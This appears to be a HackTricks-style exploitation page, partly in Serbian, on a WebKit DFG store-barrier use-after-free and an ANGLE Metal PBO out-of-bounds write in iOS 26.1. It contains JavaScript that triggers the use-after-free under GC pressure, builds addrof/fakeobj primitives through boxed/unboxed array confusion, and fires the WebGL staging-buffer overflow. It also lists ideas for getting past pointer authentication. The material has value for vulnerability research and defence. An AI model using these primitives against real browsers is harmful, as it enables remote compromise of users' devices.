# WebKit DFG Store-Barrier UAF + ANGLE PBO OOB (iOS 26.1)

{{#include ../../banners/hacktricks-training.md}}

## Sažetak
- **DFG Store Barrier bug (CVE-2025-43529)**: In `DFGStoreBarrierInsertionPhase.cpp`, a **Phi node marked escaped while its Upsilon inputs are not** causes the phase to **skip inserting a write barrier** on subsequent object stores. Under GC pressure this lets JSC free still-reachable objects → **use-after-free**.
- **Exploit target**: Primorajte **Date** objekat da materializuje butterfly (npr. `a[0] = 1.1`) tako da se butterfly oslobodi, a zatim ponovo iskorišćen kao array element storage da bi se izgradila boxed/unboxed konfuzija → `addrof`/`fakeobj` primitives.
- **ANGLE Metal PBO bug (CVE-2025-14174)**: The Metal backend allocates the PBO staging buffer using `UNPACK_IMAGE_HEIGHT` instead of the real texture height. Supplying a tiny unpack height then issuing a large `texImage2D` causes a **staging-buffer OOB write** (~240KB in the PoC below).
- **PAC blockers on arm64e (iOS 26.1)**: TypedArray `m_vector` and JSArray `butterfly` are PAC-signed; forging fake objects with attacker-chosen pointers crashes with `EXC_BAD_ACCESS`/`EXC_ARM_PAC`. Only reusing **already-signed** butterflies (boxed/unboxed reinterpretation) works.

## Okidanje DFG nedostajuće barijere → UAF
```js
function triggerUAF(flag, allocCount) {
const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
arr[arr_index] = A;                 // Tenure A in old space
const a = new Date(1111); a[0] = 1.1; // Force Date butterfly

// GC pressure
for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));

const b = {p0: 0x42424242, p1: 1.1};
let f = b; if (flag) f = 1.1;       // Phi escapes, Upsilon not escaped
A.p1 = f;                           // Missing barrier state set up

for (let i = 0; i < 1e6; ++i) {}    // GC race window
b.p1 = a;                           // Store without barrier → frees `a`/butterfly
}
```
Ključne tačke:
- Postavite **A** u stari prostor da biste aktivirali generacijske barijere.
- Kreirajte indeksirani **Date** tako da je **butterfly** cilj koji će biti oslobođen.
- Rasprašite `ArrayBuffer(0x800000)` da biste primorali GC i proširili trku.
- Neusklađenost Phi/Upsilon escape-a zaustavlja umetanje barijere; `b.p1 = a` se izvršava **without a write barrier**, pa GC povraća `a`/butterfly.

## Povraćaj butterfly → konfuzija boxed/unboxed
Nakon što GC oslobodi Date **butterfly**, rasprašite nizove tako da oslobođeni slab bude ponovo iskorišćen kao elementi za dva niza sa različitim vrstama elemenata:
```js
boxed_arr[0]   = obj;          // store as boxed pointer
const addr     = ftoi(unboxed_arr[0]); // read as float64 → addr leak
unboxed_arr[0] = itof(addr);   // write pointer bits as float
const fake     = boxed_arr[0]; // reinterpret as object → fakeobj
```
Stanje na **iOS 26.1 (arm64e)**:
- **Radi:** `addrof`, `fakeobj`, 20+ address leaks po pokretanju, inline-slot read/write (na poznatim inline fields).
- **Još nije stabilno:** generalizovan `read64`/`write64` putem inline-slot backings.

## PAC ograničenja na arm64e (zašto fake objects crash)
- **TypedArray `m_vector`** i **JSArray `butterfly`** su PAC-signed; forgovanjem pokazivača dolazi do `EXC_BAD_ACCESS` / verovatno `EXC_ARM_PAC`.
- Confusion primitive funkcioniše zato što **reuses legitimate signed butterflies**; uvođenje unsigned attacker pointers ne prolazi autentifikaciju.
- Zabeležene potencijalne ideje za zaobilaženje: JIT putevi koji preskaču auth, gadgets koji potpisuju attacker pointers, ili pivotiranje kroz ANGLE OOB.

## ANGLE Metal PBO pod-alokacija → OOB write
Koristite malu unpack height da smanjite staging buffer, zatim upload-ujte veliku texture tako da kopija pređe dozvoljenu veličinu:
```js
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height
// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```
Napomene:
- Greška u `TextureMtl.cpp`: staging buffer koristi `UNPACK_IMAGE_HEIGHT` umesto stvarne visine teksture na PBO putanji.
- U pomenutom probe-u WebGL2 PBO okidač je povezan, ali još uvek nije pouzdano uočen na iOS 26.1.

## Reference
- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)

{{#include ../../banners/hacktricks-training.md}}
